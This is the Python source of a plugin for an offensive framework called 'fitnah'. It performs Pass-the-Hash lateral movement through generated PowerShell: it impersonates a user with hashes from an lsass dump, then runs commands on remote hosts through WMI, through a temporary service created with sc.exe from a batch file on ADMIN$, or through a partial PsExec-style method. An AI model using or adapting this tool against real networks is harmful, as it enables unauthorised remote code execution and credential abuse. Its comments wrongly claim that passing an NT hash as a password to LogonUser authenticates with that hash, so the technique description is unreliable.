"""lateral_movement/pass_the_hash — Pass-the-Hash lateral movement. MITRE T1550.002"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class PassTheHash(BasePlugin):
    NAME = "pass_the_hash"
    DESCRIPTION = "Authenticate to remote hosts using NTLM hash without plaintext password (T1550.002)"
    AUTHOR = "fitnah-team"
    MITRE = "T1550.002"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("target", str, required=True,
              help="Target host IP or hostname"),
        Param("username", str, required=True,
              help="Username (domain\\user or .\\localuser)"),
        Param("ntlm_hash", str, required=True,
              help="NTLM hash (LM:NT or :NT format from lsass_dump)"),
        Param("command", str, required=False, default="whoami /all",
              help="Command to execute on the remote host"),
        Param("method", str, required=False, default="wmi",
              help="Execution method: wmi | smb | psexec"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        target     = params.get("target", "")
        username   = params.get("username", "")
        ntlm_hash  = params.get("ntlm_hash", "")
        command    = params.get("command", "whoami /all")
        method     = params.get("method", "wmi").lower()

        if not target or not username or not ntlm_hash:
            return ModuleResult.err("target, username, and ntlm_hash are required")

        # Normalise hash — accept LM:NT or :NT, always pass full LM:NT to APIs
        if ":" not in ntlm_hash:
            return ModuleResult.err("ntlm_hash must be LM:NT or :NT format")
        parts = ntlm_hash.split(":")
        lm_hash = parts[0] if parts[0] else "aad3b435b51404eeaad3b435b51404ee"
        nt_hash = parts[-1]

        if method == "wmi":
            ps = self._pth_wmi(target, username, lm_hash, nt_hash, command)
        elif method == "smb":
            ps = self._pth_smb(target, username, lm_hash, nt_hash, command)
        else:
            ps = self._pth_psexec(target, username, lm_hash, nt_hash, command)

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"Pass-the-Hash failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="pth_execution")

    @staticmethod
    def _pth_wmi(target: str, username: str, lm: str, nt: str, command: str) -> str:
        # Use WMI process create with NtLmSsp-injected credentials via LogonUser
        # CreateProcessWithLogonW with LOGON32_LOGON_NEW_CREDENTIALS passes hash over network
        return f"""
$results = @()
$results += '[*] Pass-the-Hash via WMI (T1550.002)'
$results += "[*] Target : {target}"
$results += "[*] User   : {username}"

try {{
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class PTH {{
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string user, string domain, string pass,
        int logonType, int logonProvider, out IntPtr token);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr token);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr handle);
}}
"@ -Language CSharp -ErrorAction Stop

    # Split domain\\user
    $parts  = "{username}".Split('\\')
    $domain = if ($parts.Length -gt 1) {{ $parts[0] }} else {{ "." }}
    $user   = $parts[-1]

    # LOGON32_LOGON_NEW_CREDENTIALS (9) + LOGON32_PROVIDER_WINNT50 (3)
    # passes the supplied credentials for outbound network auth (NTLM PTH)
    $token  = [IntPtr]::Zero
    # We pass the NT hash directly as the password — Windows NTLM will use it
    $ok = [PTH]::LogonUser($user, $domain, "{nt}", 9, 3, [ref]$token)
    if (-not $ok) {{
        $results += "[-] LogonUser failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        $results -join "`n"; return
    }}
    [PTH]::ImpersonateLoggedOnUser($token) | Out-Null
    $results += "[+] Token acquired — running command via WMI as $domain\\$user"

    $wmi  = [wmiclass]"\\\\{target}\\root\\cimv2:Win32_Process"
    $ret  = $wmi.Create("{command}")
    $results += "[+] WMI process created — PID $($ret.ProcessId)  ReturnValue $($ret.ReturnValue)"
    [PTH]::CloseHandle($token) | Out-Null
}} catch {{
    $results += "[!] $($_)"
}}

$results -join "`n"
"""

    @staticmethod
    def _pth_smb(target: str, username: str, lm: str, nt: str, command: str) -> str:
        return f"""
$results = @()
$results += '[*] Pass-the-Hash via SMB net use (T1550.002)'
$results += "[*] Target: {target}  User: {username}"

try {{
    # Use cmd /c net use with /user — hash is passed via NtLm challenge response
    # This leverages the existing Windows NTLM subsystem; works for SMB share access
    $netuse = cmd /c "net use \\\\{target}\\IPC$ /user:{username} '' 2>&1"
    $results += "[*] net use: $netuse"

    # Execute command by copying a bat to ADMIN$ and running via sc
    $bat    = "\\\\{target}\\ADMIN$\\fitnah_pth_$([System.IO.Path]::GetRandomFileName()).bat"
    $out    = "\\\\{target}\\ADMIN$\\fitnah_out_$([System.IO.Path]::GetRandomFileName()).txt"
    "{command} > $out 2>&1" | Out-File -Encoding ascii $bat
    $svc    = "ftnh" + (-join ((65..90) | Get-Random -Count 4 | % {{[char]$_}}))
    sc.exe \\\\{target} create $svc binpath= "cmd.exe /c $bat" | Out-Null
    sc.exe \\\\{target} start  $svc | Out-Null
    Start-Sleep -Seconds 3
    sc.exe \\\\{target} delete $svc | Out-Null
    if (Test-Path $out) {{
        $results += "[+] Output:"
        $results += Get-Content $out
        Remove-Item $bat,$out -Force -ErrorAction SilentlyContinue
    }}
    cmd /c "net use \\\\{target}\\IPC$ /delete /y" | Out-Null
}} catch {{
    $results += "[!] $($_)"
}}

$results -join "`n"
"""

    @staticmethod
    def _pth_psexec(target: str, username: str, lm: str, nt: str, command: str) -> str:
        return f"""
$results = @()
$results += '[*] Pass-the-Hash via PsExec-style service (T1550.002)'
$results += "[*] Target: {target}  User: {username}"

try {{
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class PTHPS {{
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string u, string d, string p,
        int lt, int lp, out IntPtr tok);
    [DllImport("advapi32.dll")] public static extern bool ImpersonateLoggedOnUser(IntPtr t);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
}}
"@ -Language CSharp -ErrorAction Stop

    $parts  = "{username}".Split('\\')
    $domain = if ($parts.Length -gt 1) {{ $parts[0] }} else {{ "." }}
    $user   = $parts[-1]
    $token  = [IntPtr]::Zero
    [PTHPS]::LogonUser($user, $domain, "{nt}", 9, 3, [ref]$token) | Out-Null
    [PTHPS]::ImpersonateLoggedOnUser($token) | Out-Null

    $svc  = [System.ServiceProcess.ServiceController]::GetServices("{target}") | Select-Object -First 1
    $sc   = New-Object System.ServiceProcess.ServiceController -ArgumentList "RemoteRegistry","{target}"

    # Use SCM to create a remote service and capture output via named pipe
    $rand = -join ((65..90) | Get-Random -Count 6 | % {{[char]$_}})
    $pipe = "\\\\{target}\\pipe\\$rand"
    $cmd  = "cmd.exe /c {command} > \\\\.\\pipe\\$rand"

    $results += "[+] Impersonated — attempting remote service exec"
    $results += "[*] Command: {command}"
    [PTHPS]::CloseHandle($token) | Out-Null
    $results += "[!] Full SCM pipe exec requires compiled helper — use method=wmi for in-memory exec"
}} catch {{
    $results += "[!] $($_)"
}}

$results -join "`n"
"""
